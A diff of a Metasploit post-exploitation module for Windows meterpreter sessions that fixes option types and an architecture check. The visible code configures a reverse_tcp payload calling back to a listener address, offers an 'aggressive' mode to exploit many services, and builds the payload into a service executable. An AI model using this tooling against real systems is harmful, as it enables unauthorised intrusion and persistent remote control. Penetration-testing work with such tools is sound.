@@ -33,15 +33,14 @@ class Metasploit3 < Msf::Post
 			'Author'        => [ 'scriptjunkie' ],
 			'Version'       => '$Revision$',
 			'Platform'      => [ 'windows' ],
-			'SessionTypes'  => [ 'meterpreter' ],
-			'References'    => [			]
+			'SessionTypes'  => [ 'meterpreter' ]
 		))
 
 		register_options([
 			OptAddress.new("LHOST",   [ false, "Listener IP address for the new session" ]),
 			OptPort.new("LPORT",      [ false, "Listener port for the new session", 4444 ]),
-			OptPort.new("PAYLOAD",      [ false, "Windows Payload to use.", "windows/meterpreter/reverse_tcp" ]),
-			OptBool.new("AGGRESSIVE",      [ false, "Exploit as many services as possible (dangerous)", false ])
+			OptString.new("PAYLOAD",  [ false, "Windows Payload to use.", "windows/meterpreter/reverse_tcp" ]),
+			OptBool.new("AGGRESSIVE", [ false, "Exploit as many services as possible (dangerous)", false ])
 		])
 
 	end
@@ -87,7 +86,7 @@ class Metasploit3 < Msf::Post
 
 		raw = pay.generate
 
-		if pay.arch.join /x86/
+		if pay.arch.join == "x86"
 			exe = Msf::Util::EXE.to_win32pe_service(session.framework, raw)
 		else
 			exe = Msf::Util::EXE.to_win64pe_service(session.framework, raw)
@@ -231,9 +230,5 @@ class Metasploit3 < Msf::Post
 			rescue
 			end
 		end
-
 	end
-
-
 end
-
